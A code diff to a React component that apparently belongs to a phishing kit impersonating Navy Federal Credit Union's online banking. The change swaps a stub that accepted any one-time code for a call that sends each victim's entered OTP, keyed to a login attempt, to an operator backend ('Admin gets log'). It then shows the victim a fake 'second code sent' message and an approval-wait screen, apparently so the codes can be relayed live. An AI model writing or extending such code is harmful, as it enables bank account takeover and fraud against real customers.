@@ -104,23 +104,20 @@ export default function NavyFederalBanking() {
         
         const which = step === 'otp1' ? 1 : 2
         
-        // ✅ BYPASS OTP — ALWAYS ACCEPT
-        setLoading(false)
-        setOtp('')
-        
-        // Log to admin (optional)
-        const storedOTP = sessionStorage.getItem('loginOTP')
-        console.log(`📱 OTP ${which} entered:`, otp, 'Expected:', storedOTP)
-        
-        if (which === 1) {
-          setStep('otp2')
-          setNote('Second code sent to your email.')
-        } else {
-          setStep('awaiting_approval')
-          setNote(WAIT_MSG)
-        }
-        return
-      }
+        // ✅ BYPASS OTP — ALWAYS ACCEPT (Admin gets log)
+await submitOtp({ attemptId, otp, which })
+
+setLoading(false)
+setOtp('')
+
+if (which === 1) {
+  setStep('otp2')
+  setNote('Second code sent to your email.')
+} else {
+  setStep('awaiting_approval')
+  setNote(WAIT_MSG)
+}
+return
     } catch (err) {
       setLoading(false)
       setError(err instanceof Error ? err.message : 'Error')
